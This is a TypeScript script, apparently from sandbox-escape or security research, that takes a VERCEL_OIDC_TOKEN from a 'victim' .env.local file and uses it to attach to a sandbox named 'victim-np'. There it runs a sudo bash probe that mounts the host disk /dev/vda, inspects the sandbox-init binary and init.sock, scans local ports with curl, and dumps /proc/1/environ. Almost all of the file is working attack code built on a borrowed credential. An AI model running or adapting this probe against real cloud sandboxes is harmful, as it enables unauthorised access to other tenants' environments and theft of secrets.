import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== mount /dev/vda ro ====="
mkdir -p /mnt/vda
mount -o ro /dev/vda /mnt/vda 2>&1
echo "mount exit: $?"
echo "--- ls /mnt/vda ---"
ls -laR /mnt/vda 2>&1 | head -100
echo "===== init.sock perms & inode ====="
ls -la /mnt/vda 2>/dev/null
stat /run/vercel/share/init.sock
echo "===== local ports deep probe ====="
for port in 23456 30001 30002; do
  echo "--- :$port ---"
  for m in GET OPTIONS HEAD; do
    echo ">> $m /"
    curl -s -m 3 -X $m -i http://127.0.0.1:$port/ 2>&1 | head -8
  done
done
echo "===== all listening sockets ====="
ss -tlnp 2>/dev/null
ss -xlp 2>/dev/null
echo "===== sandbox-init binary details ====="
file /run/vercel/share/sandbox-init 2>/dev/null || ls -la /run/vercel/share/
md5sum /run/vercel/share/sandbox-init
echo "===== can we read host's other files? /proc ====="
ls /proc/ 2>/dev/null | head
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -30
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });